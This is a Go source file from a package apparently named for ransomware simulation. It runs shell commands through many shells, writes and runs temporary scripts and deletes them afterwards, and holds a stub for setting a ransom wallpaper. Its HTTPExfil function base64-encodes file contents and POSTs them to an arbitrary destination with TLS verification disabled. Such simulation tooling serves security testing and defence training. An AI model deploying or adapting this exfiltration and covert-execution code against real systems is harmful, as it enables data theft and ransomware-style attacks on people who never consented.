//+build !windows

package ransimware

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

// ExecuteScript will run shell commands using the provided method, as
// well as attempt to clean up artificats, if requested.
func ExecuteScript(
	method string,
	clean bool,
	cmds ...string,
) (string, error) {
	if len(cmds) == 0 {
		return "", nil
	}

	switch method {
	case "#!bash":
		return executeShellScript(
			cmds[0],
			append([]string{"#!/usr/bin/env bash"}, cmds[1:]...),
			clean,
		)
	case "#!sh":
		return executeShellScript(
			cmds[0],
			append([]string{"#!/usr/bin/env sh"}, cmds[1:]...),
			clean,
		)
	case "#!zsh":
		return executeShellScript(
			cmds[0],
			append([]string{"#!/usr/bin/env zsh"}, cmds[1:]...),
			clean,
		)
	case "ash":
		return executeShell("ash", cmds)
	case "bash", "shell":
		return executeShell("bash", cmds)
	case "csh":
		return executeShell("csh", cmds)
	case "dash":
		return executeShell("dash", cmds)
	case "ksh":
		return executeShell("ksh", cmds)
	case "sh":
		return executeShell("sh", cmds)
	case "tcsh":
		return executeShell("tcsh", cmds)
	case "zsh":
		return executeShell("zsh", cmds)
	default:
		return "", fmt.Errorf("Unsupported method")
	}
}

func executeShell(shell string, cmds []string) (string, error) {
	var e error
	var o []byte
	var out []string

	// Run cmds
	for _, cmd := range cmds {
		o, e = exec.Command(shell, "-c", cmd).Output()

		if len(o) > 0 {
			out = append(out, strings.TrimSpace(string(o)))
		}

		if e != nil {
			return strings.Join(out, "\n"), e
		}
	}

	return strings.Join(out, "\n"), nil
}

func executeShellScript(
	name string,
	cmds []string,
	clean bool,
) (string, error) {
	var e error
	var o []byte

	// Create shell script
	if e = writeScript(name, cmds); e != nil {
		return "", e
	}

	// Make script executable
	if e = os.Chmod(name, os.ModePerm); e != nil {
		return "", e
	}

	// Run shell script
	o, e = exec.Command(name).Output()

	// Clean up if requested
	if clean {
		os.Remove(name)
	}

	return strings.TrimSpace(string(o)), e
}

// HTTPExfil will return a function pointer to an ExfilFunc that
// exfils via HTTP POST requests with the specified headers.
func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
	return func(path string, b []byte) error {
		var b64 string
		var e error
		var n int
		var req *http.Request
		var stream = bytes.NewReader(b)
		var tmp [4 * 1024 * 1024]byte

		http.DefaultTransport.(*http.Transport).TLSClientConfig =
			&tls.Config{InsecureSkipVerify: true}

		// Set timeout to 1 second
		http.DefaultClient.Timeout = time.Second

		for {
			if n, e = stream.Read(tmp[:]); (n == 0) && (e == io.EOF) {
				return nil
			} else if e != nil {
				return e
			}

			// Create request
			b64 = base64.StdEncoding.EncodeToString(tmp[:n])
			req, e = http.NewRequest(
				http.MethodPost,
				dst,
				bytes.NewBuffer([]byte(path+" "+b64)),
			)
			if e != nil {
				return e
			}

			// Set headers
			for k, v := range headers {
				req.Header.Set(k, v)
			}

			// Send Message
			http.DefaultClient.Do(req)
		}
	}
}

// WallpaperNotify is a NotifyFunc that sets the background wallpaper.
func WallpaperNotify(
	img string,
	png []byte,
	fit string,
	clean bool,
) NotifyFunc {
	return func() error {
		return fmt.Errorf("OS not supported")
	}
}

func writeScript(name string, cmds []string) error {
	var e error
	var f *os.File

	// Open script
	if f, e = os.Create(name); e != nil {
		return e
	}
	defer f.Close()

	// Write script
	for _, cmd := range cmds {
		if _, e = f.WriteString(cmd + "\n"); e != nil {
			return e
		}
	}

	return nil
}
